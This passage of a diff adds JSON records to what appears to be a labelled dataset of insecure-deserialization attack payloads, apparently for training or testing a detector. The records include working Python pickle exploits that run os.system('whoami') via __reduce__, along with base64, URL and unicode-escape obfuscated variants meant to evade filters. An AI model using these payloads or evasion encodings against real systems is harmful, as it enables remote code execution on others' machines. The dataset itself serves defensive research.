+    "payload_sha256": "5080eb360fc56668cc5663673c3ebd9079cae635a5a33b9f60287d6abd0ff135",
+    "original_id": "raw_deser_00025",
+    "original_payload": "import cPickle, os\nfrom base64 import b64encode, b64decode\n\nclass Evil(object):\n    def __reduce__(self):\n        return (os.system,(\"whoami\",))\n\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)",
+    "obfuscated_payload": "aW1wb3J0JTBBY1BpY2tsZSwrb3MKZnJvbSUwOWJhc2U2NCUwOWltcG9ydCUwQWI2NGVuY29kZSwlMDliNjRkZWNvZGUKCmNsYXNzJTBBRXZpbChvYmplY3QpOgolMEFkZWYlMEFfX3JlZHVjZV9fKHNlbGYpOgorcmV0dXJuKyhvcy5zeXN0ZW0sKCJ3aG9hbWkiLCkpCgplJTBBPSUwQUV2aWwoKQpldmlsX3Rva2VuJTBBPStiNjRlbmNvZGUoY1BpY2tsZS5kdW1wcyhlKSkKcHJpbnQoIllvdXIlMEFFdmlsJTBBVG9rZW4lMDk6JTA5e30iKS5mb3JtYXQoZXZpbF90b2tlbik",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 50165644,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00026__obf01",
+    "payload": "import%20cPickle%2C%20os",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00026",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "50f19915c79bf9fc197791cc1772edf89a8e12278a8cc6ed4a555f4d90768945",
+    "original_id": "raw_deser_00026",
+    "original_payload": "import cPickle, os",
+    "obfuscated_payload": "import%20cPickle%2C%20os",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50262620,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00026__obf02",
+    "payload": "aW1wb3J0IGNQaWNrbGUsIG9z",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00026",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "50f19915c79bf9fc197791cc1772edf89a8e12278a8cc6ed4a555f4d90768945",
+    "original_id": "raw_deser_00026",
+    "original_payload": "import cPickle, os",
+    "obfuscated_payload": "aW1wb3J0IGNQaWNrbGUsIG9z",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 50263629,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00026__obf03",
+    "payload": "import+cPickle,+os",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00026",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "50f19915c79bf9fc197791cc1772edf89a8e12278a8cc6ed4a555f4d90768945",
+    "original_id": "raw_deser_00026",
+    "original_payload": "import cPickle, os",
+    "obfuscated_payload": "import+cPickle,+os",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 50264638,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00026__obf04",
+    "payload": "import%2520cPickle%252C%2520os",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00026",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "50f19915c79bf9fc197791cc1772edf89a8e12278a8cc6ed4a555f4d90768945",
+    "original_id": "raw_deser_00026",
+    "original_payload": "import cPickle, os",
+    "obfuscated_payload": "import%2520cPickle%252C%2520os",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 50265647,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00027__obf01",
+    "payload": "evil_token%2520%253D%2520b64encode%2528cPickle.dumps%2528e%2529%2529",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00027",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0bc81f3ce9b27d06d3db1837d6f956dab2288addb6a2465dde55badd9b8e7cf0",
+    "original_id": "raw_deser_00027",
+    "original_payload": "evil_token = b64encode(cPickle.dumps(e))",
+    "obfuscated_payload": "evil_token%2520%253D%2520b64encode%2528cPickle.dumps%2528e%2529%2529",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 50362623,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00027__obf02",
+    "payload": "ZXZpbF90b2tlbiA9IGI2NGVuY29kZShjUGlja2xlLmR1bXBzKGUpKQ==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00027",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0bc81f3ce9b27d06d3db1837d6f956dab2288addb6a2465dde55badd9b8e7cf0",
+    "original_id": "raw_deser_00027",
+    "original_payload": "evil_token = b64encode(cPickle.dumps(e))",
+    "obfuscated_payload": "ZXZpbF90b2tlbiA9IGI2NGVuY29kZShjUGlja2xlLmR1bXBzKGUpKQ==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 50363632,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00027__obf03",
+    "payload": "evil_token%0A=+b64encode(cPickle.dumps(e))",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00027",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0bc81f3ce9b27d06d3db1837d6f956dab2288addb6a2465dde55badd9b8e7cf0",
+    "original_id": "raw_deser_00027",
+    "original_payload": "evil_token = b64encode(cPickle.dumps(e))",
+    "obfuscated_payload": "evil_token%0A=+b64encode(cPickle.dumps(e))",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 50364641,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00027__obf04",
+    "payload": "ZXZpbF90b2tlbiUwQT0lMEFiNjRlbmNvZGUoY1BpY2tsZS5kdW1wcyhlKSk=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00027",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0bc81f3ce9b27d06d3db1837d6f956dab2288addb6a2465dde55badd9b8e7cf0",
+    "original_id": "raw_deser_00027",
+    "original_payload": "evil_token = b64encode(cPickle.dumps(e))",
+    "obfuscated_payload": "ZXZpbF90b2tlbiUwQT0lMEFiNjRlbmNvZGUoY1BpY2tsZS5kdW1wcyhlKSk=",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 50365650,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00028__obf01",
+    "payload": "import%2520pickle%250Aimport%2520base64%250A%250Aclass%2520RCE%253A%250A%2520%2520%2520%2520def%2520__reduce__%2528self%2529%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520return%2520eval%252C%2520%2528%2522__import__%2528%2527os%2527%2529.system%2528%2527whoami%2527%2529%2522%252C%2529%250Apickled%2520%253D%2520pickle.dumps%2528RCE%2528%2529%2529%250Aprint%2528base64.b64encode%2528pickled%2529.decode%2528%2529%2529",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00028",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d79af2c62bcd51f59e4698e3054c0cb70f212d6f74a4abe522ad8050d30cf580",
+    "original_id": "raw_deser_00028",
+    "original_payload": "import pickle\nimport base64\n\nclass RCE:\n    def __reduce__(self):\n        return eval, (\"__import__('os').system('whoami')\",)\npickled = pickle.dumps(RCE())\nprint(base64.b64encode(pickled).decode())",
+    "obfuscated_payload": "import%2520pickle%250Aimport%2520base64%250A%250Aclass%2520RCE%253A%250A%2520%2520%2520%2520def%2520__reduce__%2528self%2529%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520return%2520eval%252C%2520%2528%2522__import__%2528%2527os%2527%2529.system%2528%2527whoami%2527%2529%2522%252C%2529%250Apickled%2520%253D%2520pickle.dumps%2528RCE%2528%2529%2529%250Aprint%2528base64.b64encode%2528pickled%2529.decode%2528%2529%2529",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 50462626,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00028__obf02",
+    "payload": "aW1wb3J0IHBpY2tsZQppbXBvcnQgYmFzZTY0CgpjbGFzcyBSQ0U6CiAgICBkZWYgX19yZWR1Y2VfXyhzZWxmKToKICAgICAgICByZXR1cm4gZXZhbCwgKCJfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnd2hvYW1pJykiLCkKcGlja2xlZCA9IHBpY2tsZS5kdW1wcyhSQ0UoKSkKcHJpbnQoYmFzZTY0LmI2NGVuY29kZShwaWNrbGVkKS5kZWNvZGUoKSk=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00028",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d79af2c62bcd51f59e4698e3054c0cb70f212d6f74a4abe522ad8050d30cf580",
+    "original_id": "raw_deser_00028",
+    "original_payload": "import pickle\nimport base64\n\nclass RCE:\n    def __reduce__(self):\n        return eval, (\"__import__('os').system('whoami')\",)\npickled = pickle.dumps(RCE())\nprint(base64.b64encode(pickled).decode())",
+    "obfuscated_payload": "aW1wb3J0IHBpY2tsZQppbXBvcnQgYmFzZTY0CgpjbGFzcyBSQ0U6CiAgICBkZWYgX19yZWR1Y2VfXyhzZWxmKToKICAgICAgICByZXR1cm4gZXZhbCwgKCJfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnd2hvYW1pJykiLCkKcGlja2xlZCA9IHBpY2tsZS5kdW1wcyhSQ0UoKSkKcHJpbnQoYmFzZTY0LmI2NGVuY29kZShwaWNrbGVkKS5kZWNvZGUoKSk=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 50463635,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00028__obf03",
+    "payload": "import%09pickle\nimport%09base64\n\nclass+RCE:\n%09def+__reduce__(self):\n%0Areturn%09eval,+(\"__import__('os').system('whoami')\",)\npickled+=%0Apickle.dumps(RCE())\nprint(base64.b64encode(pickled).decode())",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00028",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d79af2c62bcd51f59e4698e3054c0cb70f212d6f74a4abe522ad8050d30cf580",
+    "original_id": "raw_deser_00028",
+    "original_payload": "import pickle\nimport base64\n\nclass RCE:\n    def __reduce__(self):\n        return eval, (\"__import__('os').system('whoami')\",)\npickled = pickle.dumps(RCE())\nprint(base64.b64encode(pickled).decode())",
+    "obfuscated_payload": "import%09pickle\nimport%09base64\n\nclass+RCE:\n%09def+__reduce__(self):\n%0Areturn%09eval,+(\"__import__('os').system('whoami')\",)\npickled+=%0Apickle.dumps(RCE())\nprint(base64.b64encode(pickled).decode())",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 50464644,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00028__obf04",
+    "payload": "import%20pickle%0Aimport%20base64%0A%0Aclass%20RCE%3A%0A%20%20%20%20def%20__reduce__%28self%29%3A%0A%20%20%20%20%20%20%20%20return%20eval%2C%20%28%22__import__%28%27os%27%29.system%28%27whoami%27%29%22%2C%29%0Apickled%20%3D%20pickle.dumps%28RCE%28%29%29%0Aprint%28base64.b64encode%28pickled%29.decode%28%29%29",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00028",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d79af2c62bcd51f59e4698e3054c0cb70f212d6f74a4abe522ad8050d30cf580",
+    "original_id": "raw_deser_00028",
+    "original_payload": "import pickle\nimport base64\n\nclass RCE:\n    def __reduce__(self):\n        return eval, (\"__import__('os').system('whoami')\",)\npickled = pickle.dumps(RCE())\nprint(base64.b64encode(pickled).decode())",
+    "obfuscated_payload": "import%20pickle%0Aimport%20base64%0A%0Aclass%20RCE%3A%0A%20%20%20%20def%20__reduce__%28self%29%3A%0A%20%20%20%20%20%20%20%20return%20eval%2C%20%28%22__import__%28%27os%27%29.system%28%27whoami%27%29%22%2C%29%0Apickled%20%3D%20pickle.dumps%28RCE%28%29%29%0Aprint%28base64.b64encode%28pickled%29.decode%28%29%29",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50465653,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00029__obf01",
+    "payload": "import%20pickle",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00029",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "888eeaa6fc98f1969af4b734f9bba9fcdcf74bccfa51bee4aa74a3a2b527995c",
+    "original_id": "raw_deser_00029",
+    "original_payload": "import pickle",
+    "obfuscated_payload": "import%20pickle",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50562629,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00029__obf02",
+    "payload": "aW1wb3J0IHBpY2tsZQ==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00029",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "888eeaa6fc98f1969af4b734f9bba9fcdcf74bccfa51bee4aa74a3a2b527995c",
+    "original_id": "raw_deser_00029",
+    "original_payload": "import pickle",
+    "obfuscated_payload": "aW1wb3J0IHBpY2tsZQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 50563638,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00029__obf03",
+    "payload": "import%09pickle",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00029",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "888eeaa6fc98f1969af4b734f9bba9fcdcf74bccfa51bee4aa74a3a2b527995c",
+    "original_id": "raw_deser_00029",
+    "original_payload": "import pickle",
+    "obfuscated_payload": "import%09pickle",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 50564647,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00029__obf04",
+    "payload": "import%25250Apickle",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00029",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "888eeaa6fc98f1969af4b734f9bba9fcdcf74bccfa51bee4aa74a3a2b527995c",
+    "original_id": "raw_deser_00029",
+    "original_payload": "import pickle",
+    "obfuscated_payload": "import%25250Apickle",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 50565656,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00030__obf01",
+    "payload": "pickled%20%3D%20pickle.dumps%28RCE%28%29%29",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00030",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0a1865b45086d2841a9f050adbd3e3f29a48c6992c542f3f7021708dbca99140",
+    "original_id": "raw_deser_00030",
+    "original_payload": "pickled = pickle.dumps(RCE())",
+    "obfuscated_payload": "pickled%20%3D%20pickle.dumps%28RCE%28%29%29",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50662632,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00030__obf02",
+    "payload": "cGlja2xlZCA9IHBpY2tsZS5kdW1wcyhSQ0UoKSk",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00030",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0a1865b45086d2841a9f050adbd3e3f29a48c6992c542f3f7021708dbca99140",
+    "original_id": "raw_deser_00030",
+    "original_payload": "pickled = pickle.dumps(RCE())",
+    "obfuscated_payload": "cGlja2xlZCA9IHBpY2tsZS5kdW1wcyhSQ0UoKSk",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 50663641,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00030__obf03",
+    "payload": "pickled \\u003d pickle.dumps(RCE(\\u0029\\u0029",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00030",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0a1865b45086d2841a9f050adbd3e3f29a48c6992c542f3f7021708dbca99140",
+    "original_id": "raw_deser_00030",
+    "original_payload": "pickled = pickle.dumps(RCE())",
+    "obfuscated_payload": "pickled \\u003d pickle.dumps(RCE(\\u0029\\u0029",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 50664650,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00030__obf04",
+    "payload": "%70ickled = pi%63kle%2Edumps(RCE())",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00030",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "0a1865b45086d2841a9f050adbd3e3f29a48c6992c542f3f7021708dbca99140",
+    "original_id": "raw_deser_00030",
+    "original_payload": "pickled = pickle.dumps(RCE())",
+    "obfuscated_payload": "%70ickled = pi%63kle%2Edumps(RCE())",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50665659,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00031__obf01",
+    "payload": "pr%69nt(base64.b64%65ncode(p%69ckled).dec%6Fde())",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00031",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ea7d69ff33a6ba04a6fc99bb00c8359e791f1932a61ec47c74bf170ab344e8b0",
+    "original_id": "raw_deser_00031",
+    "original_payload": "print(base64.b64encode(pickled).decode())",
+    "obfuscated_payload": "pr%69nt(base64.b64%65ncode(p%69ckled).dec%6Fde())",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 50762635,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00031__obf02",
+    "payload": "cHJpbnQoYmFzZTY0LmI2NGVuY29kZShwaWNrbGVkKS5kZWNvZGUoKSk",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00031",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ea7d69ff33a6ba04a6fc99bb00c8359e791f1932a61ec47c74bf170ab344e8b0",
+    "original_id": "raw_deser_00031",
+    "original_payload": "print(base64.b64encode(pickled).decode())",
+    "obfuscated_payload": "cHJpbnQoYmFzZTY0LmI2NGVuY29kZShwaWNrbGVkKS5kZWNvZGUoKSk",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 50763644,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00031__obf03",
+    "payload": "print(base64.b64encode(pickled).decode\\u0028))",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00031",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ea7d69ff33a6ba04a6fc99bb00c8359e791f1932a61ec47c74bf170ab344e8b0",
+    "original_id": "raw_deser_00031",
+    "original_payload": "print(base64.b64encode(pickled).decode())",
+    "obfuscated_payload": "print(base64.b64encode(pickled).decode\\u0028))",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 50764653,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00031__obf04",
+    "payload": "print%2528base64.b64encode%2528pickled%2529.decode%2528%2529%2529",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00031",
